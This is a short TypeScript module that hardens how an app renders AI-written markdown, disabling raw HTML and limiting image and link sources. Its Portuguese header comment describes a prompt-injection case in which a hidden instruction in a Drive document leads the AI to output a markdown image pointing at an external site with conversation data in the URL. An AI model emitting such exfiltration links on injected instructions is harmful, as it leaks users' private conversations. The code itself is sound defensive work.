/**
 * Markdown vindo da IA (assistente, chat) — P3 lote 18d. O Streamdown, por
 * omissão, aceita HTML em bruto (rehype-raw) e imagens/ligações de qualquer
 * sítio. Uma instrução escondida num documento do Drive podia levar a IA a
 * responder com `![](https://site-externo/?d=…)` e mandar dados da conversa
 * para fora. Aqui: sem HTML em bruto, imagens só da própria app, ligações só
 * https ou da app.
 */
import { defaultRehypePlugins, type StreamdownProps } from "streamdown";

type RehypePlugins = NonNullable<StreamdownProps["rehypePlugins"]>;

export function aiRehypePlugins(origin: string = typeof window !== "undefined" ? window.location.origin : "https://app.invalid"): RehypePlugins {
  const harden = defaultRehypePlugins.harden as unknown as [unknown, Record<string, unknown>];
  // Sem `defaultRehypePlugins.raw` (HTML em bruto); `harden` com listas fechadas.
  return [
    [harden[0], { ...harden[1], allowedImagePrefixes: [origin], allowedLinkPrefixes: ["https://", origin], defaultOrigin: origin, allowDataImages: false }],
    defaultRehypePlugins.katex,
  ] as RehypePlugins;
}
